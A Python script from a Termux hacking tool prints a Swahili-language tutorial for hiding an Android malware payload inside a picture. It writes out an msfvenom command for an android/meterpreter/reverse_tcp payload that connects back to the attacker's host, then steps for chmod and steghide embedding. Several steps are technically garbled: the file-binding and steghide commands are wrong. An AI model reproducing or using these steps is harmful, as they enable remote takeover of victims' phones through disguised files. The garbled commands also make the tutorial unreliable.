#!user/bin/python
import os
import sys
import datetime
import time
#Colours choosen by amlike
#Colours choosen by amlike
YELLOWBG = '\033[103m'
R = '\033[31m' #Red
Y = '\033[93m' #yellow
G = '\033[92m'  #green
clear = '\033[0m'  #clear
B = '\033[1;34m' #Blue
cyan = '\033[96m' #cyan
cy='\033[095m'  #cy
cya='\033[035m' #cya
red = '\033[31m'
yellow = '\033[93m'
green = '\033[92m'
clear = '\033[0m'
bold = '\033[01m'
cyan = '\033[96m'
cy='\033[095m'
cya='\033[035m'


os.system("clear")
os.system("cd $SCHOME && cd EASY-M-SPLOIT && bash banner.sh")

def delay_print(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.2)
print("")
print("")
print("")
delay_print(yellow+"HOW TO BIND IMAGE WITH PAYLOAD USING TERMUX")
print("")
print("")
print("")
print("")
time.sleep(3)
delay_print(green+" STEPS TO FOLLOW UP.By AmlikeTz")
print("")
print("")
print("")
time.sleep(3)

delay_print(cya+"First Unatakiwa kuinstalll metasploit katika termux yako kwa  kutumia single click kwa sababu amlike kaisha kurahisishia saiv huwez angaika tena kuinstall metasploit katika simu yako. so nenda apo juu chagua install metasploit katika termux, tambua kuinstall metasploit kunachukua mda sanaa so baada ya kuinstall hio metasploit Rudi hapaa kupata maelkezo")
print("")
print("")
print("")
time.sleep(3)
delay_print(cya+" baad ya kuinstall metasploit katika teemux yako hatua inayofata ni kuinstall steghige katika termux yako so andika kweny terminal ya termux yako hivi apt install steghige amaaa pkg install stegighe")
print("")
print("")
delay_print(yellow+"BAADA YA kuinstall metasploit unaweza tumia virus viren ku tengenez android payload na kulisten data traffick kutoka kwenye payload yako ulioitengeneza so virus viren ni rahisi kutumia na rafik kwa biggner tofaut na metasploit frame work")
print("")

print("")
print("")
time.sleep(3)
delay_print(B+"Baada ya apo unatakiwa kutengeneza payload kweny termux yako ambayo ndo utaificha kweny picha so kichofata sasa ni kutengeneza payload kweny metasplot kwahyo unaweza andika hiv kweny terminal ya termux yako ili kuweza kutengeneza hio payload  msfvenom -p android/meterpreter/reverse_tcp LHOST=ip yako apaa  LPORT= Port nunber yako apaa  R> amlike.apk       baada ya apo apo yenye jina la amlike itakuwa created note unaweza weka jina la app jina lolote")
print("")
print("")
print("")
time.sleep(3)
delay_print(B+"Then baada ya apo nenda  kwenye terminal yako ya termux ka kcopy path iliopo hio payload na path iliopo picha unayotaka kuembed")
print("")
print("")
print("")
time.sleep(3)
delay_print(yellow+"baaya ya apo copy picha hio na app unayatak ku embed uviweke katika home directory ya termux yako")
print("")
print("")
print("")
time.sleep(3)
delay_print(yellow+"hatua inayofata sasa ni kubind payload na picha hio kwahyi andika hivi kweny terminal yako cp -r /$CHOME/pictures.wet.jpg     /$SCHOME/apps/amlike.apk   apo wew utaweka location yako wew ambapo hio picha na paykoad vipi  baada ya apo piga ls kisha fungua New Seseion")
print("")
print("")
print("")
time.sleep(3)
delay_print(R+" hatua inayofata sasa ni kuifanya app hio ulioimbed iweze kuwa excuted so utatumia chmod 777 amlike.apk   baada ya apo piga ls then ")
print("")
print("")
print("")
time.sleep(3)
delay_print(R+" step inayofata sasa ni ku imbed app yetu kwa kutumia steghide kwahyo utatumia hii command steghide embed -cf (aap name)  -EF  (picture name) boom after zat utakua umemalza kufanya embending congratulations enjoy it")
print("")
print("")
print("")
time.sleep(3)
delay_print(cyan+"By AmlikeTz")

print("")
print("")
print("")
time.sleep(3)
os.system("clear")
time.sleep(1)
print("")
print("")
print(yellow+"I HOPE YOU UNDERSTAND!! SO WE ARE BACK TO THE MAIN MENU OF THE TOOL🙏🙏")
print("")
time.sleep(4)
os.system("cd ../ && python main.py")

